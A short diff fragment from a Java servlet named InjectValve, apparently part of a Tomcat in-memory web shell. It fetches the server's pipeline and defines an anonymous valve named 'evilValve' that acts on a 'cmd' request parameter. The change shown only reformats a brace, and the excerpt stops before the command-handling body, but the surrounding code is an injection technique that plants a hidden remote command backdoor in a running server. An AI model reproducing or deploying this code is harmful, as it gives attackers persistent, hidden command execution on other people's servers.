@@ -34,7 +34,8 @@ public class InjectValve extends HttpServlet {
 
             StandardPipeline pipeline = (StandardPipeline) standardContext.getPipeline();
 
-            ValveBase evilValve = new ValveBase() {
+            ValveBase evilValve = new ValveBase()
+            {
                 @Override
                 public void invoke(Request request, Response response) throws ServletException,IOException {
                     if (request.getParameter("cmd") != null) {
